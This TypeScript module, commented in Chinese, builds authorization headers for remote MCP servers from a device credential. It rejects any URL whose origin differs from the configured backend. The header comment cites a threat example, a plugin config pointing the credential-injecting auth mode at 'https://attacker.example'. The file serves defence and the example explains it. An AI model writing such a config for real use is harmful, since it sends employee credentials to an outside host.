/**
 * MCP `auth: "sid-backend"`：远程 MCP 用设备凭据鉴权（P4 委托授权）。
 *
 * 为什么不用 `${VAR}` 展开 headers 或静态 authToken：凭据会续期，写死在配置里的值
 * 续期后就失效；而且插件配置能读任意环境变量，本身就是一条外泄通道。
 * 这里改成按请求从 `getUsableCredentialToken()` 取，配置文件里永远不出现凭据明文。
 *
 * ⚠️ 凭据外泄防线：这个开关会被插件的 MCP 配置使用。只看 `auth` 字段的话，
 * 任何插件写一句 `auth:"sid-backend", url:"https://attacker.example"` 就能把员工凭据发走。
 * 所以**只有 url 的 origin 与 backend.url 的 origin 完全一致才注入**，否则拒绝连接
 * （fail-closed：不是「不带凭据照连」，那会让配置写错的人以为连上了却拿不到数据）。
 * backend.url 本身不读项目级 settings（见 identity/backend-url.ts），仓库改不了它。
 */

import { resolveBackendUrl } from "../identity/backend-url.ts";
import { getUsableCredentialToken, RELOGIN_HINT } from "../identity/credential.ts";

export const SID_BACKEND_AUTH = "sid-backend";

export class BackendAuthRejectedError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "BackendAuthRejectedError";
  }
}

/**
 * 校验并返回带设备凭据的 headers。
 *
 * @param url 已做过 `${VAR}` 展开的最终连接地址——必须校验真正要连的那个，
 *            校验展开前的模板等于没校验。
 * @param headers 配置里的其余 headers；其中的 Authorization 会被覆盖。
 *
 * 返回对象上的 Authorization 是 getter：transport 每次请求都 `{...this.headers}`
 * 展开一次，于是每个请求都重新取凭据，进程内续期（auth login）后不用重连。
 */
export function buildSidBackendHeaders(
  serverName: string,
  url: string,
  headers: Record<string, string> | undefined,
): Record<string, string> {
  let target: URL;
  // ws 的 origin 是 ws://…，与 https 后端永不相等；单独报错，免得用户看到 origin 不一致一头雾水
  if (/^wss?:/i.test(url)) {
    throw new BackendAuthRejectedError(
      `MCP 服务器 ${serverName} 的 auth:"sid-backend" 只支持 http / http-json / sse 传输`,
    );
  }
  try {
    target = new URL(url);
  } catch {
    throw new BackendAuthRejectedError(`MCP 服务器 ${serverName} 的 url 不合法：${url}`);
  }

  const backend = resolveBackendUrl();
  if (!backend) {
    throw new BackendAuthRejectedError(
      `MCP 服务器 ${serverName} 声明了 auth:"sid-backend"，但未配置合法的 backend.url，拒绝连接`,
    );
  }
  if (target.origin !== backend.origin) {
    throw new BackendAuthRejectedError(
      `MCP 服务器 ${serverName} 声明了 auth:"sid-backend"，但 url 的 origin（${target.origin}）` +
        `与 backend.url（${backend.origin}）不一致，拒绝连接以免设备凭据外泄`,
    );
  }

  const initial = getUsableCredentialToken();
  if (!initial) {
    throw new BackendAuthRejectedError(
      `MCP 服务器 ${serverName} 需要设备凭据，但本机没有可用凭据。${RELOGIN_HINT}`,
    );
  }

  // 去掉配置里任何大小写的 Authorization，避免与注入值并存
  const rest: Record<string, string> = {};
  for (const [k, v] of Object.entries(headers ?? {})) {
    if (k.toLowerCase() !== "authorization") rest[k] = v;
  }
  Object.defineProperty(rest, "Authorization", {
    enumerable: true,
    get() {
      // 凭据中途过期 / 被登出时发空 Bearer 让服务端回 401，绝不沿用旧值：
      // 用户登出后进程里还在发他的凭据，是比连接失败更糟的结果
      return `Bearer ${getUsableCredentialToken() ?? ""}`;
    },
  });
  return rest;
}
